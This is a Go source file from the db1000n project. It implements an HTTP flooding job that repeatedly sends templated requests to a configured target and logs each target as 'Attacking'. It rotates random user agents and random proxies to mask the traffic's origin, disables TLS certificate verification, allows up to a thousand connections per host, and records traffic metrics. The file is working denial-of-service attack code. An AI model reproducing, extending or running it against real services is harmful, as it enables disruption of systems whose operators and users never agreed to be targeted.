package jobs

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"net"
	"net/url"
	"text/template"
	"time"

	"github.com/corpix/uarand"
	"github.com/google/uuid"
	"github.com/mitchellh/mapstructure"
	"github.com/valyala/fasthttp"
	"github.com/valyala/fasthttp/fasthttpproxy"

	"github.com/Arriven/db1000n/src/metrics"
	"github.com/Arriven/db1000n/src/utils"
	"github.com/Arriven/db1000n/src/utils/templates"
)

func parseHTTPRequestTemplates(method, path, body string, headers map[string]string) (
	methodTpl, pathTpl, bodyTpl *template.Template, headerTpls map[*template.Template]*template.Template, err error) {
	if methodTpl, err = templates.Parse(method); err != nil {
		return nil, nil, nil, nil, fmt.Errorf("error parsing method template: %v", err)
	}

	if pathTpl, err = templates.Parse(path); err != nil {
		return nil, nil, nil, nil, fmt.Errorf("error parsing path template: %v", err)
	}

	if bodyTpl, err = templates.Parse(body); err != nil {
		return nil, nil, nil, nil, fmt.Errorf("error parsing body template: %v", err)
	}

	headerTpls = make(map[*template.Template]*template.Template, len(headers))
	for key, value := range headers {
		keyTpl, err := templates.Parse(key)
		if err != nil {
			return nil, nil, nil, nil, fmt.Errorf("error parsing header key template %q: %v", key, err)
		}

		valueTpl, err := templates.Parse(value)
		if err != nil {
			return nil, nil, nil, nil, fmt.Errorf("error parsing header value template %q: %v", value, err)
		}

		headerTpls[keyTpl] = valueTpl
	}

	return methodTpl, pathTpl, bodyTpl, headerTpls, nil
}

func fasthttpJob(ctx context.Context, args Args, debug bool) error {
	defer utils.PanicHandler()

	var jobConfig struct {
		BasicJobConfig

		Path    string
		Method  string
		Body    string
		Headers map[string]string
		Client  map[string]interface{} // See HTTPClientConfig
	}
	if err := mapstructure.Decode(args, &jobConfig); err != nil {
		log.Printf("Error parsing job config: %v", err)
		return err
	}

	client := newFastHTTPClient(jobConfig.Client, debug)

	methodTpl, pathTpl, bodyTpl, headerTpls, err := parseHTTPRequestTemplates(
		jobConfig.Method, jobConfig.Path, jobConfig.Body, jobConfig.Headers)
	if err != nil {
		return err
	}

	trafficMonitor := metrics.Default.NewWriter(ctx, "traffic", uuid.New().String())
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	req := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(req)

	for jobConfig.Next(ctx) {
		method, path, body := templates.Execute(methodTpl, nil), templates.Execute(pathTpl, nil), templates.Execute(bodyTpl, nil)
		dataSize := len(method) + len(path) + len(body) // Rough uploaded data size for reporting

		select {
		case <-ticker.C:
			log.Printf("Attacking %v", jobConfig.Path)
		default:
		}

		req.SetRequestURI(path)
		req.Header.SetMethod(method)
		req.SetBodyString(body)
		// Add random user agent and configured headers
		req.Header.Set("user-agent", uarand.GetRandom())
		for keyTpl, valueTpl := range headerTpls {
			key, value := templates.Execute(keyTpl, nil), templates.Execute(valueTpl, nil)
			req.Header.Set(key, value)
			dataSize += len(key) + len(value)
		}
		sendFastHTTPRequest(client, req, debug)

		trafficMonitor.Add(dataSize)

		time.Sleep(time.Duration(jobConfig.IntervalMs) * time.Millisecond)
	}

	return nil
}

func newFastHTTPClient(clientCfg map[string]interface{}, debug bool) (client *fasthttp.Client) {
	var clientConfig struct {
		TLSClientConfig *tls.Config    `mapstructure:"tls_config,omitempty"`
		Timeout         *time.Duration `mapstructure:"timeout"`
		ReadTimeout     *time.Duration `mapstructure:"read_timeout"`
		WriteTimeout    *time.Duration `mapstructure:"write_timeout"`
		IdleTimeout     *time.Duration `mapstructure:"idle_timeout"`
		MaxIdleConns    *int           `mapstructure:"max_idle_connections"`
		ProxyURLs       string         `mapstructure:"proxy_urls"`
	}

	if err := mapstructure.Decode(clientCfg, &clientConfig); err != nil && debug {
		log.Printf("Failed to parse job client, ignoring: %v", err)
	}

	timeout := 90 * time.Second
	if clientConfig.Timeout != nil {
		timeout = *clientConfig.Timeout
	}

	readTimeout := timeout
	if clientConfig.ReadTimeout != nil {
		readTimeout = *clientConfig.ReadTimeout
	}

	writeTimeout := timeout
	if clientConfig.WriteTimeout != nil {
		writeTimeout = *clientConfig.WriteTimeout
	}

	idleTimeout := timeout
	if clientConfig.IdleTimeout != nil {
		idleTimeout = *clientConfig.IdleTimeout
	}

	maxIdleConns := 1000
	if clientConfig.MaxIdleConns != nil {
		maxIdleConns = *clientConfig.MaxIdleConns
	}

	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
	}
	if clientConfig.TLSClientConfig != nil {
		tlsConfig = clientConfig.TLSClientConfig
	}

	var proxy = func() string { return "" }
	proxylist := []byte(templates.ParseAndExecute(clientConfig.ProxyURLs, nil))
	if len(proxylist) > 0 {
		if debug {
			log.Printf("clientConfig.ProxyURLs: %v", string(proxylist))
		}

		var proxyURLs []string

		if err := json.Unmarshal(proxylist, &proxyURLs); err == nil {
			if debug {
				log.Printf("proxyURLs: %v", proxyURLs)
			}

			// Return random proxy from the list
			proxy = func() string {
				if len(proxyURLs) == 0 {
					return ""
				}

				proxyString := proxyURLs[rand.Intn(len(proxyURLs))]

				u, err := url.Parse(proxyString)
				if err != nil {
					return ""
				}

				return u.String()
			}
		} else if debug {
			log.Printf("Failed to parse proxies: %v", err) // It will still send traffic as if no proxies were specified, no need for warning
		}
	}

	return &fasthttp.Client{
		ReadTimeout:                   readTimeout,
		WriteTimeout:                  writeTimeout,
		MaxConnDuration:               timeout,
		MaxIdleConnDuration:           idleTimeout,
		MaxConnsPerHost:               maxIdleConns,
		NoDefaultUserAgentHeader:      true, // Don't send: User-Agent: fasthttp
		DisableHeaderNamesNormalizing: true, // If you set the case on your headers correctly you can enable this
		DisablePathNormalizing:        true,
		TLSConfig:                     tlsConfig,
		// increase DNS cache time to an hour instead of default minute
		Dial: fasthttpProxyDial(proxy, timeout, (&fasthttp.TCPDialer{
			Concurrency:      4096,
			DNSCacheDuration: time.Hour,
		}).Dial),
	}
}

func fasthttpProxyDial(proxyFunc func() string, timeout time.Duration, backup fasthttp.DialFunc) fasthttp.DialFunc {
	return func(addr string) (net.Conn, error) {
		proxy := proxyFunc()
		if proxy == "" {
			return backup(addr)
		} else {
			return fasthttpproxy.FasthttpHTTPDialerTimeout(proxy, timeout)(addr)
		}
	}
}

func sendFastHTTPRequest(client *fasthttp.Client, req *fasthttp.Request, debug bool) {
	if debug {
		log.Printf("%s %s started at %d", string(req.Header.Method()), string(req.RequestURI()), time.Now().Unix())
	}

	err := client.Do(req, nil)
	if err != nil {
		metrics.IncHTTP(string(req.Host()), string(req.Header.Method()), metrics.StatusFail)
		if debug {
			log.Printf("Error sending request %v: %v", req, err)
		}

		return
	}
	metrics.IncHTTP(string(req.Host()), string(req.Header.Method()), metrics.StatusSuccess)
}
